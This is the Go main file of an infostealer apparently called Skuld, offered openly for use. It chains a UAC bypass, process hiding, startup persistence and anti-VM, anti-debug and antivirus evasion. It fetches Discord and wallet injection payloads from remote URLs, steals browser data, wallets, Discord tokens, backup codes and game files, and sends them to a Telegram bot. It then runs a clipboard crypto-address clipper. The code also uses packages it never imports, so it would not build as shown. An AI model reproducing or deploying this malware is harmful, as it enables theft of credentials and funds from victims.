package main

import (
	"fmt"
	"log"
	"sync"

	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivm"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
	"github.com/hackirby/skuld/utils/collector"
)

func main() {
	CONFIG := map[string]interface{}{
		"bot_token": "YOUR_TELEGRAM_BOT_TOKEN", // Your Telegram Bot Token
		"chat_id":   "YOUR_TELEGRAM_CHAT_ID",   // Your Telegram Chat ID (group)
		"cryptos": map[string]string{
			"BTC":  "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Bitcoin address
			"BCH":  "qr5jqsj3wdxkrx5c5v7hfxpg2v9f8w6h2c8r4t3e5d", // Your Bitcoin Cash address
			"ETH":  "0x742d35Cc6634C0532925a3b8D404fddaF8d8B9d2", // Your Ethereum address
			"XMR":  "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRJ5CA1jGTvL9sADxnHPdtDv5L4m8KvVqQ8cANHHwz", // Your Monero address
			"LTC":  "LTC1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Litecoin address
			"XCH":  "xch1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Chia address
			"XLM":  "GAHK7EEG2WWHVKDNT4CEQFZGKF2LGDSW2IVM4S5DP42RBW3K6BTODB4A", // Your Stellar address
			"TRX":  "TRX9qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Tron address
			"ADA":  "addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Cardano address
			"DASH": "Xxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Dash address
			"DOGE": "Dxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Dogecoin address
		},
	}

	// Validate Telegram configuration
	if CONFIG["bot_token"].(string) == "YOUR_TELEGRAM_BOT_TOKEN" || CONFIG["chat_id"].(string) == "YOUR_TELEGRAM_CHAT_ID" {
		log.Fatal("❌ Please configure bot_token and chat_id in CONFIG - Edit main.go with your Telegram credentials")
	}

	// Request administrator privileges FIRST
	if !program.IsElevated() {
		log.Println("🔐 Requesting administrator privileges...")
		if err := program.RequestElevation(); err != nil {
			log.Printf("Failed to request elevation: %v", err)
		} else {
		return
		}
	}

	if program.IsAlreadyRunning() {
		return
	}

	// UAC Bypass for admin privileges
	uacbypass.Run()

	// Hide console and process
	hideconsole.Run()
	program.HideSelf()

	// Setup persistence if not in startup path
	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	// Anti-detection measures
	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	// Initialize data collector
	dataCollector := collector.NewDataCollector(
		CONFIG["bot_token"].(string),
		CONFIG["chat_id"].(string),
	)
	defer dataCollector.Cleanup()

	// Send startup message
	dataCollector.SendMessage("🚀 Skuld Stealer Started - Data Collection in Progress...")

	// Start injections (background processes)
	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		dataCollector,
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		dataCollector,
	)

	// Run data collection modules with proper error handling
	dataCollector.SendMessage("📊 Starting system information collection...")
	
	var wg sync.WaitGroup
	
	// System information (always first)
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ System module error: %v", r))
			}
		}()
		system.Run(dataCollector)
		dataCollector.SendMessage("✅ System information collected")
	}()

	// Browsers data collection (PRIORITY)
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ Browsers module error: %v", r))
			}
		}()
		browsers.Run(dataCollector)
		dataCollector.SendMessage("✅ Browser data collected")
	}()

	// Wallets data collection (HIGHEST PRIORITY)
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ Wallets module error: %v", r))
			}
		}()
		wallets.Run(dataCollector)
		dataCollector.SendMessage("✅ Wallet data collected")
	}()

	// Discord tokens
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ Tokens module error: %v", r))
			}
		}()
		tokens.Run(dataCollector)
		dataCollector.SendMessage("✅ Discord tokens collected")
	}()

	// Discord backup codes
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ Discord codes module error: %v", r))
			}
		}()
		discodes.Run(dataCollector)
		dataCollector.SendMessage("✅ Discord backup codes collected")
	}()

	// Common files and crypto detection (PRIORITY)
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ CommonFiles module error: %v", r))
			}
		}()
		commonfiles.Run(dataCollector)
		dataCollector.SendMessage("✅ Common files and crypto data collected")
	}()

	// Games data
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				dataCollector.SendMessage(fmt.Sprintf("❌ Games module error: %v", r))
			}
		}()
		games.Run(dataCollector)
		dataCollector.SendMessage("✅ Games data collected")
	}()

	// Wait for all data collection to complete
	dataCollector.SendMessage("⏳ Waiting for all modules to complete...")
	wg.Wait()

	// Send all collected data
	dataCollector.SendMessage("📦 Preparing final archive...")
	if err := dataCollector.SendCollectedData(); err != nil {
		log.Printf("Failed to send collected data: %v", err)
		dataCollector.SendMessage(fmt.Sprintf("❌ Error sending data: %v", err))
		
		// Try alternative sending method
		dataCollector.SendMessage("🔄 Trying alternative upload method...")
		if err := dataCollector.SendDataInParts(); err != nil {
			dataCollector.SendMessage(fmt.Sprintf("❌ Alternative upload failed: %v", err))
		}
	} else {
		dataCollector.SendMessage("✅ All data sent successfully to Telegram!")
	}

	// Clean up wallet data after successful transmission
	os.RemoveAll(filepath.Join(os.TempDir(), "skuld-wallets"))

	// Start crypto clipper (runs indefinitely in background)
	dataCollector.SendMessage("💰 Starting crypto clipper...")
	go clipper.Run(CONFIG["cryptos"].(map[string]string))

	// Keep the program running for clipper
	select {}
}